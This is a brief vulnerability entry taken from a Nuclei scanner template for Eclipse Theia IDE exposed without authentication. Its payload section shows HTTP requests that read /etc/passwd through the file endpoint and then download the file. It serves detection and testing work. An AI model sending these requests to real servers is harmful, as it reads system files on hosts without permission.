# Vulnerability: Eclipse Theia IDE - LFI to RCE
**Classification:** THEIA
**Source:** Nuclei Template (`theia-lfi-to-rce.yaml`)

## Description
Detected Eclipse Theia IDE was exposed without authentication, allowing unauthenticated attackers to access the web-based IDE with terminal capabilities, file system access, and arbitrary command execution.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /files/?uri=file:///etc/passwd HTTP/1.1
Host: {{Hostname}}

GET /files/download/?id={{file_id}} HTTP/1.1
Host: {{Hostname}}
```

